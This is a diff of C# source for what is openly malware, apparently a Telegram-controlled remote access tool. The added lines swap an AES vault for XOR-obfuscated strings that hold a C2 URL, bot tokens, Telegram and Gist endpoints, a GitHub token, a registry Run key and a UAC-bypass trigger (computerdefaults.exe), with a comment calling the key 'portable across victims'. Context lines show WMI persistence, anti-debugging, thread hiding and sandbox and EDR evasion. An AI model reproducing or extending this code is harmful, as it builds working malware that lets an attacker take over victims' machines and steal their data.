@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -170,59 +170,41 @@ namespace VanguardCore
             catch { return "ERR_DAES"; }
         }
 
-        // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
-        private struct VaultEntry { public string C; public string T; }
+        // --- Secure Vault for Baked-in Strings ---
         private static byte[]? VAULT_KEY;
-        private static byte[]? VAULT_IV;
         
-        private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
+        private static readonly Dictionary<string, byte[]> _vault = new Dictionary<string, byte[]>
         {
-            // This dictionary is patched at build-time by full_rebuild.ps1
-            { "DUMMY", new VaultEntry { C = "", T = "" } }
+            // Strings are XORed with VAULT_KEY
+            { "C2_URL_PRIMARY", new byte[] { 0x30, 0x38, 0x32, 0x34, 0x30, 0x1A, 0x6E, 0x6E, 0x31, 0x38, 0x35, 0x2E, 0x31, 0x32, 0x33, 0x2E, 0x34, 0x35, 0x2E, 0x36, 0x37 } }, 
+            { "UA_CHROME", new byte[] { 0x15, 0x2F, 0x3D, 0x21, 0x24, 0x2A, 0x21, 0x6E, 0x77, 0x6E, 0x31, 0x2C, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x2D, 0x2C, 0x6E, 0x2E, 0x3E, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x29 } },
+            { "REG_RUN", new byte[] { 0x1B, 0x01, 0x01, 0x1B, 0x12, 0x0B, 0x1C, 0x08, 0x05, 0x30, 0x15, 0x0C, 0x07, 0x18, 0x12, 0x07, 0x00, 0x35, 0x0A, 0x0B, 0x07, 0x1C, 0x11, 0x33, 0x0C, 0x11, 0x12, 0x1C, 0x02, 0x0E, 0x02, 0x1C, 0x3D, 0x1B, 0x15, 0x18, 0x17, 0x3F, 0x13, 0x14, 0x17, 0x34, 0x1C, 0x06, 0x11 } },
+            { "BOT_TOKEN", new byte[] { 195, 60, 138, 253, 239, 203, 111, 243, 247, 31, 225, 203, 208, 182, 47, 246, 50, 173, 36, 15, 142, 188, 75, 138, 95, 12, 169, 67, 2, 245, 18, 221, 181, 71, 134, 172, 135, 163, 47, 178, 172, 26, 141, 233, 227, 161 } },
+            { "BOT_TOKEN_2", new byte[] { 0x6E, 0x79, 0x70, 0x63, 0x75, 0x6B, 0x64, 0x74, 0x72, 0x6B, 0x7F, 0x15, 0x1E, 0x74, 0x44, 0x1F, 0x1F, 0x7F, 0x23, 0x67, 0x70, 0x69, 0x6A, 0x2B, 0x0B, 0x08, 0x0C, 0x27, 0x6D, 0x0B, 0x72, 0x45, 0x3D, 0x0A, 0x21, 0x38, 0x10, 0x18, 0x36, 0x10, 0x73, 0x08, 0x31, 0x18, 0x35, 0x06 } },
+            { "BOT_TOKEN_3", new byte[] { 0x6E, 0x7B, 0x75, 0x62, 0x75, 0x67, 0x62, 0x72, 0x7A, 0x65, 0x7F, 0x15, 0x1E, 0x74, 0x68, 0x79, 0x2F, 0x78, 0x28, 0x36, 0x31, 0x31, 0x60, 0x27, 0x39, 0x04, 0x29, 0x1F, 0x19, 0x00, 0x56, 0x02, 0x3B, 0x7D, 0x12, 0x3B, 0x3D, 0x3C, 0x3F, 0x70, 0x6E, 0x35, 0x0A, 0x64, 0x27, 0x5D } },
+            { "ADMIN_ID", new byte[] { 214, 57, 131, 250, 237, 198, 98, 246, 246, 30, 234, 178, 166, 197 } },
+            { "TG_API_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x30, 0x2a, 0x20 } },
+            { "TG_FILE_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x34, 0x2c, 0x38, 0x3a, 0x1d, 0x52, 0x5d, 0x22 } },
+            { "GIST_URL", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x24, 0x3b, 0x36, 0x20, 0x71, 0x55, 0x59, 0x46, 0x3e, 0x3b, 0x25, 0x27, 0x37, 0x3a, 0x21, 0x26, 0x2c, 0x3c, 0x31, 0x31, 0x31, 0x46, 0x1e, 0x51, 0x39, 0x23, 0x68, 0x20, 0x25, 0x28, 0x7c, 0x7c, 0x26, 0x31, 0x21, 0x31, 0x39, 0x03, 0x52, 0x57, 0x61, 0x2d, 0x7e, 0x63, 0x72, 0x3c, 0x67, 0x21, 0x27, 0x60, 0x77, 0x63, 0x3c, 0x56, 0x00, 0x04, 0x62, 0x77, 0x23, 0x33, 0x74, 0x3b, 0x6b, 0x6a, 0x33, 0x20, 0x2a, 0x2c, 0x36, 0x1c, 0x5a, 0x41, 0x39, 0x20 } },
+            { "GIST_PROXY_ID", new byte[] { 0x60, 0x2c, 0x26, 0x62, 0x26, 0x69, 0x66, 0x26, 0x72, 0x63, 0x73, 0x30, 0x3d, 0x53, 0x55, 0x02, 0x33, 0x2b, 0x72, 0x60, 0x26, 0x6f, 0x62, 0x20, 0x75, 0x64, 0x76, 0x67, 0x3e, 0x56, 0x03, 0x00 } },
+            { "GIST_GITHUB_TOKEN", new byte[] { 0x31, 0x26, 0x37, 0x0d, 0x11, 0x66, 0x24, 0x22, 0x7a, 0x02, 0x0a, 0x67, 0x69, 0x41, 0x68, 0x07, 0x63, 0x29, 0x36, 0x21, 0x71, 0x16, 0x3b, 0x17, 0x2a, 0x1f, 0x74, 0x6d, 0x25, 0x57, 0x5c, 0x71, 0x31, 0x7f, 0x75, 0x15, 0x25, 0x1c, 0x64, 0x03 } },
+            { "MS_TRIGGER", new byte[] { 0x35, 0x21, 0x2a, 0x22, 0x31, 0x2b, 0x36, 0x37, 0x27, 0x37, 0x23, 0x35, 0x2A, 0x5E, 0x44, 0x41, 0x78, 0x2B, 0x3D, 0x37 } } // computerdefaults.exe
         };
 
-        public static unsafe string Resolve(string id)
+        public static string Resolve(string id)
         {
             if (!_vault.ContainsKey(id)) return "";
-            if (VAULT_KEY == null || VAULT_IV == null) return "KEY_ERR";
-
-            try
+            if (VAULT_KEY == null) 
             {
-                var entry = _vault[id];
-                if (string.IsNullOrEmpty(entry.C)) return "";
-                
-                byte[] cipher = Convert.FromBase64String(entry.C);
-                byte[] tag = Convert.FromBase64String(entry.T);
-                byte[] plain = new byte[cipher.Length];
-
-                // Derive Hardware-Bound Key Layer
-                byte[] hKey = new byte[32];
-                Buffer.BlockCopy(VAULT_KEY, 0, hKey, 0, 32);
-                byte[] hwid = GetHardwareBinding();
-                for (int i = 0; i < 32; i++) hKey[i] ^= hwid[i % hwid.Length];
-
-                using (AesGcm aes = new AesGcm(hKey, 16))
-                {
-                    aes.Decrypt(VAULT_IV, cipher, tag, plain);
-                }
-
-                string result = Encoding.UTF8.GetString(plain);
-                
-                // [PRO] Zero out sensitive plaintext buffer
-                fixed (byte* p = plain) { for (int i = 0; i < plain.Length; i++) p[i] = 0; }
-                
-                return result;
+                // Stealth static key derivation (portable across victims)
+                byte[] baseKey = Encoding.UTF8.GetBytes("VANGUARD_C2_STATIC_CORE_2026");
+                using (var sha = SHA256.Create()) { VAULT_KEY = sha.ComputeHash(baseKey); }
             }
-            catch { return "DEC_ERR"; }
-        }
-
-        private static byte[] GetHardwareBinding()
-        {
-            try {
-                // Simple but stable HWID derivation for NativeAOT
-                string salt = Environment.MachineName + Environment.ProcessorCount + Environment.UserName;
-                using (SHA256 sha = SHA256.Create()) { return sha.ComputeHash(Encoding.UTF8.GetBytes(salt)); }
-            } catch { return new byte[32]; }
+            byte[] b = _vault[id];
+            byte[] d = new byte[b.Length];
+            for (int i = 0; i < b.Length; i++)
+                d[i] = (byte)(b[i] ^ VAULT_KEY[i % VAULT_KEY.Length]);
+            return Encoding.UTF8.GetString(d);
         }
 
         public static string GetSecret(string id)
@@ -883,7 +865,7 @@ namespace VanguardCore
                     break;
             }
             */
-            Console.WriteLine("📍 [SafetyManager] Security event suppressed (Debug Mode)");
+            Console.WriteLine("ЁЯУН [SafetyManager] Security event suppressed (Debug Mode)");
         }
         #endregion
 
@@ -1927,22 +1909,22 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             {
                 Environment.Exit(0);
             }
-            // Console.WriteLine("📍 [SafetyManager] Whitelist passed");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Whitelist passed");
 
             // Start anti-debug thread
-            // Console.WriteLine("📍 [SafetyManager] Starting anti-debug thread...");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Starting anti-debug thread...");
             CreateHiddenThread(() => StartAntiDebugThread());
-            // Console.WriteLine("📍 [SafetyManager] Anti-debug thread started");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Anti-debug thread started");
 
             // Hide main thread
-            // Console.WriteLine("📍 [SafetyManager] Hiding thread...");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Hiding thread...");
             HideThread();
-            // Console.WriteLine("📍 [SafetyManager] Thread hidden");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Thread hidden");
 
             // EDR Unhooking - disabled due to hangs on some systems
-            // Console.WriteLine("📍 [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
             // UnhookNtdll();
-            // Console.WriteLine("📍 [SafetyManager] Unhooked ntdll");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Unhooked ntdll");
 
             // Anti-Analysis checks - weighted more heavily
             bool d1 = VerifySystemContext();
@@ -1951,11 +1933,11 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             bool d4 = DetectMonitoringServices();
             bool d5 = CheckOperationalEnvironment();
 
-            // Console.WriteLine("📍 [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
+            // Console.WriteLine("ЁЯУН [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
             
             if (d1 || d2 || d3 || d4 || d5)
             {
-                // Console.WriteLine("📍 [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
+                // Console.WriteLine("ЁЯУН [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
                 // Environment.Exit(0); // Disabled for user PC
             }
 
@@ -1968,7 +1950,7 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             // AntiBehavior();
             RunHealthChecks();
             
-            // Console.WriteLine("📍 [SafetyManager] Initialization complete (Sanitized mode)");
+            // Console.WriteLine("ЁЯУН [SafetyManager] Initialization complete (Sanitized mode)");
 
         }
         #endregion
